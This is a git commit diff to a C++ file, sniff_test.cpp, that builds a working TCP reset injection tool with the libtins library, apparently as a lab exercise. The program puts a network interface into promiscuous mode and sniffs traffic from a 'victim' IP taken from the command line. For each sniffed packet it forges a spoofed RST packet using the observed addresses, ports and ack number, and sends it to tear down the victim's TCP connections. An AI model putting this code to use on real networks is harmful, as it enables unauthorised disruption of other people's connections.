9eac39cc702b80446565cc9da47639e40c585a20
mohib181 <mohib18169@gmail.com>
2021-07-23 20:00:50 +0600

    sniffing works

--- sniff_test.cpp
+++ sniff_test.cpp
@@ -4,8 +4,13 @@
 using namespace Tins;
 using namespace std;
 
-void sendPkt(IPv4Address src_addr, IPv4Address dst_addr, uint16_t sport, uint16_t dport, uint32_t seq_num) {
-	EthernetII eth;
+string network_interface = "enp0s3";
+
+void send_RST_Pkt(EthernetII::address_type eth_src, EthernetII::address_type eth_dst, 
+			 IPv4Address src_addr, IPv4Address dst_addr, uint16_t sport, uint16_t dport,
+			 uint32_t seq_num) {
+	
+	EthernetII eth(eth_src, eth_dst);
 	IP *ip = new IP(src_addr, dst_addr);
 	TCP *tcp = new TCP(sport, dport);
 	tcp->flags(tcp->flags() | TCP::RST);
@@ -17,104 +22,74 @@ void sendPkt(IPv4Address src_addr, IPv4Address dst_addr, uint16_t sport, uint16_
 	// ip is eth's inner pdu
 	eth.inner_pdu(ip);
 	
-	// The actual sender
-	PacketSender sender;
-
-	// Send the packet through the default interface
-	sender.send(eth, "enp0s3");
-	
+	// Packet details
 	cout << "RST packet:" << endl;
-	cout << ip->src_addr() << ':' << tcp->sport() << "->" << ip->dst_addr() << ':' << tcp->dport() << " seq: " << tcp->seq() << " flags: " << tcp->flags() << endl << endl;
-		
-}
-
-void sendRST(IPv4Address src_addr, IPv4Address dst_addr, uint16_t sport, uint16_t dport, uint32_t seq_num) {
-	// We'll use the default interface(default gateway)
-	//NetworkInterface iface = NetworkInterface::default_interface();
-
-	/* Retrieve this structure which holds the interface's IP, 
-	* broadcast, hardware address and the network mask.
-	*/
-	//NetworkInterface::Info info = iface.addresses();
-
-	/* Create an Ethernet II PDU which will be sent to 
-	* 77:22:33:11:ad:ad using the default interface's hardware 
-	* address as the sender.
-	*/
-	//EthernetII eth(src_mac_addr.to_string(), dst_mac_addr.to_string());
-	//EthernetII eth = EthernetII();
-
-	/* Create an IP PDU, with 192.168.0.1 as the destination address
-	* and the default interface's IP address as the sender.
-	*/
-	//eth /= IP(src_addr, dst_addr);
-
-	/* Create a TCP PDU using 13 as the destination port, and 15 
-	* as the source port.
-	*/
-	//eth /= TCP(sport, dport);
-
-	/* Create a RawPDU containing the string "I'm a payload!".
-	*/
-	//eth /= RawPDU("I'm a payload!");
-	
-	//TCP *tcp = eth.find_pdu<TCP>();
-	//tcp->flags(tcp->flags() | TCP::RST);
-	//tcp->seq(seq_num);
-
-	// The actual sender
-	//PacketSender sender;
-
-	// Send the packet through the default interface
-	//sender.send(eth, "enp0s3");
-	
-	//cout << "called" << endl;*/
-	
-	EthernetII eth;
-	IP *ip = new IP(src_addr, dst_addr);
-	TCP *tcp = new TCP(sport, dport);
-	tcp->flags(tcp->flags() | TCP::RST);
-	tcp->seq(seq_num);
-
-	// tcp is ip's inner pdu
-	ip->inner_pdu(tcp);
-
-	// ip is eth's inner pdu
-	eth.inner_pdu(ip);
-	
+	cout << eth.src_addr() << " -> " << eth.dst_addr() << endl;
+	cout << ip->src_addr() << ':' << tcp->sport() << "->" << ip->dst_addr() << ':' << tcp->dport()
+		 << " seq: " << tcp->seq() << endl << endl;
+		 
 	// The actual sender
 	PacketSender sender;
-
+	
 	// Send the packet through the default interface
-	sender.send(eth, "enp0s3");
+	sender.send(eth, network_interface);
 }
 
-bool callback(const PDU &pdu) {
+
+bool sniff_pkt(const PDU &pdu) {
 	// Find the eth layer
 	const EthernetII &eth = pdu.rfind_pdu<EthernetII>();
+	
 	// Find the IP layer
 	const IP &ip = pdu.rfind_pdu<IP>(); 
+	
 	// Find the TCP layer
 	const TCP &tcp = pdu.rfind_pdu<TCP>(); 
-	if(ip.src_addr() == "192.168.1.11") {
-		cout << "sniiffed: " << endl;
-		//cout << eth.src_addr() << " -> " << eth.dst_addr() << endl;
-		cout << ip.src_addr() << ':' << tcp.sport() << "->" << ip.dst_addr() << ':' << tcp.dport() << " seq: " << tcp.seq() << endl << endl;
-		
-		//sendRST(ip.src_addr().to_string(), ip.dst_addr().to_string(), tcp.sport(), tcp.dport(), tcp.seq());
-		sendPkt(ip.src_addr(), ip.dst_addr(), tcp.sport(), tcp.dport(), tcp.seq());
-	}
-	else cout << "else" << endl;
 	
+	cout << "sniiffed: " << endl;
+	cout << eth.src_addr() << " -> " << eth.dst_addr() << endl;
+	cout << ip.src_addr() << ':' << tcp.sport() << "->" << ip.dst_addr() << ':' << tcp.dport()
+		 << " seq: " << tcp.seq() << " ack: " << tcp.ack_seq() << endl << endl;
+		
+	send_RST_Pkt(eth.src_addr(), eth.dst_addr(), ip.src_addr(), ip.dst_addr(), tcp.sport(), tcp.dport(), tcp.ack_seq());
 	
 	return true;
 }
 
-int main() {
+void do_sniffing(IPv4Address victim) {
+	string filter = "ip src " + victim.to_string();
+	
+	// Setting up sniffer configuration
 	SnifferConfiguration config;
 	config.set_promisc_mode(true);
 	config.set_immediate_mode(true);
-	//config.set_filter("ip src 192.168.1.11");
-	Sniffer sniffer("enp0s3", config);
-	sniffer.sniff_loop(callback);
+	config.set_filter(filter);
+	
+	// Setting up the sniffer
+	Sniffer sniffer(network_interface, config);
+	sniffer.sniff_loop(sniff_pkt);
+}
+
+int main(int argc, char* argv[]) {
+	if (argc != 2) {
+		cout << "Usage: " <<* argv << " <Victim>" << endl;
+		return 1;
+	}
+	
+	IPv4Address victim;
+    try {
+        // Convert dotted-notation ip addresses to integer. 
+        victim = argv[1];
+    } catch (...) {
+        cout << "Invalid ip found...\n";
+        return 2;
+    }
+    
+    
+    try {
+        do_sniffing(victim);
+    } catch (runtime_error& ex) {
+   	    cout << "Runtime error: " << ex.what() << endl;
+        return 7;
+    }
 }
